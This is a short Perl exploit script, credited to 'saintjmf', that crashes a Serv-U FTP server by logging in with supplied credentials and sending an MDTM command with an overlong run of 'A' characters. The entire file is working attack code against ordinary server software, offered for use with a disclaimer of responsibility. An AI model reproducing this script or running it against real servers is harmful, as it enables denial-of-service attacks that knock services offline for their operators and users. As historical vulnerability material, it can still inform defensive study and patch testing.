## Coded by saintjmf
## This exploits Serv-u MDTM buffer overflow - Shutsdown server
## Discovered by bkbll - Info provided by securityfocus
## For exploit to work you need valid username and password
## I do not take responsibility for the use of this code

use IO::Socket qw(:DEFAULT :crlf);
print "Serv-u MDTM Buffer overflow - by saintjmf\n";

## Get Host port unsername and password

my $host = shift || die print "\nUsage: <program> <Host> <port> <username> <password>\n";
my $port = shift || die print "\nUsage: <program> <Host> <port> <username> <password> \n";

$username = shift || die print "\nUsage: <program> <Host> <port> <username> <password> \n"; 
$password = shift || die print "\nUsage: <program> <Host> <port> <username> <password> \n";

## Create Socket
my $socket = IO::Socket::INET->new("$host:$port")  or die print "\nUnable to connect -- $!\n";

print "connecting...............\n\n";

connecter($socket);


print "Server should be stopped\n";


## Sub that sends username, password and exploit

sub connecter{	
	$/ = CRLF;
	my $socket2 = shift;
	my $message2 = <$socket2>;
	chomp $message2;
	print "$message2\n";
	sleep(5);
	print $socket2 "user $username",CRLF;
	$message2 = <$socket2>;
	chomp $message2;
	print "$message2\n";
sleep (5);
	print $socket2 "pass $password", CRLF;

	$message2 = <$socket2>;
	chomp $message2;
	print "$message2\n";
sleep (4);
	print "Sending MDTM Overflow.....\n";
	print $socket2 "MDTM 20041111111111+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /test.txt" ,CRLF;

}
